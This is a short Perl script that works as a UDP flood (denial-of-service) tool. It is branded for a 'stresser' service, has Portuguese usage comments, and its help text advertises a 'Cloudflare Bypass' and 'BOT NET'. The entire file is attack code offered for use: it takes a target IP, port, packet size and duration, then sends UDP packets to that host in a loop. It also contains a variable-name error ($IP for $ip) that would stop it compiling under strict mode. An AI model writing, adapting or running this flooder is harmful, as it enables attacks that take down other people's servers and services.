#!/usr/bin/perl
 
#Created by ./HENRY
#Port - Use '80' Para Pessoas ou Porta 53 Para DNS Ou 8090 Para Site
#Size - Use '100 - 1000' (Reccomended).
 
use Socket;
use strict;
 
print '

$--------------------------$
|  |  |  |  | |  | __||    |
|  |  || |  | |  |__       |
|  |  | ||  | |  |__       |
|  |__|  |__| |__| __||    |
|                          |
| www.fb.com/stresser.co   |
$__________________________$
';
print "\n";
 
 
if ($#ARGV != 3) {
  print "\n\t\t\tCloudflare Bypass... [BOT NET]";
  print "-Ex) PHP IoT\n";
  print "-Stresser.co Shoot IP '1.1.1.1' Time '300' Port '80'\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~STOP \'Ctrl-C\'\n\n";
print "|IP||Port|\t\t |Time|\n";
print "|$IP|$port|\t\t |$time|\n";
print "STOP 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}